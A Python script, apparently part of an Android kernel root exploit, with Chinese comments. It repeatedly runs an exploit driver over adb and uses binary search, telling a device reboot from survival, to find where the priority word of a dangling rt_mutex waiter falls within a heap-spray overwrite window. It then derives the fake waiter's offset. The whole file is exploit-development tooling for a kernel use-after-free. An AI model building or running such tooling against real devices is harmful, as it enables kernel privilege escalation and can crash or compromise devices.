# -*- coding: utf-8 -*-
"""bisect_prio_word.py — 二分定位: 悬空 rt_waiter 的 prio 字落在覆盖窗口的第几个 8 字节字。

判据(auto.py 每轮重算 slide, 因为崩溃就重启):
  probe <lo> <n> : 把窗口里字 [lo, lo+n) 填 120(=受害者当前 prio), 其余填 0。
  - 真实 prio 字 ∈ [lo,lo+n) ⇒ rt_mutex_waiter_equal 命中 ⇒ 链走 [3] 直接出 ⇒ 存活
    (日志里有 "punch 已返回", 且设备不重启)
  - 否则 ⇒ prio 不等 ⇒ 继续走 ⇒ pc/lock 读到 0 或 120 这种小整数 ⇒ 解引用炸 ⇒ 重启
"""
import re, subprocess, sys, time, os

BASE = r'G:\项目\Windows管理\usb\临时root'
ADB = r'C:\adb\platform-tools\adb.exe'
DEV = '<DEVICE_SERIAL>'
WORDS = 64


def run(lo, n):
    p = subprocess.run([sys.executable, os.path.join(BASE, 'cm57', 'auto.py'),
                        'probe %d %d' % (lo, n)], capture_output=True, text=True,
                       encoding='utf-8', errors='replace', timeout=900)
    out = p.stdout + p.stderr
    survived = ('punch 已返回' in out) or ('punch ' in out and 'ret=0' in out)
    m = re.search(r'选定 slide=([0-9a-f]+)', out)
    print('  probe [%3d,%3d) -> %s   slide=%s' % (
        lo, lo + n, '存活(命中)' if survived else '炸(未命中)', m.group(1) if m else '?'))
    return survived


def main():
    lo, n = 0, WORDS
    # 先确认整窗命中(前提), 再二分
    print('前提校验: 整窗 = 120 应存活')
    if not run(0, WORDS):
        print('!! 整窗都不命中 ⇒ 覆盖模型有问题, 停')
        return
    lo, hi = 0, WORDS
    while hi - lo > 1:
        mid = (lo + hi) // 2
        # 问: 目标字 < mid ?  用 probe [lo,mid) 只覆盖左半边; 若存活 ⇒ 在左半
        if run(lo, mid - lo):
            hi = mid
        else:
            lo = mid
        time.sleep(2)
    print('===> prio 字的窗口字下标 = %d  (字节偏移 0x%x)' % (lo, lo * 8))
    print('     ⇒ 假 waiter 起点字下标 = %d (prio 在 waiter+0x40=第7字)' % (lo - 7))
    print('     ⇒ 与模型 SR_AT(j)=SR_FB+0x88+j 的差 = %d 字节' % (lo * 8 - (0x88 + 0x40)))


main()
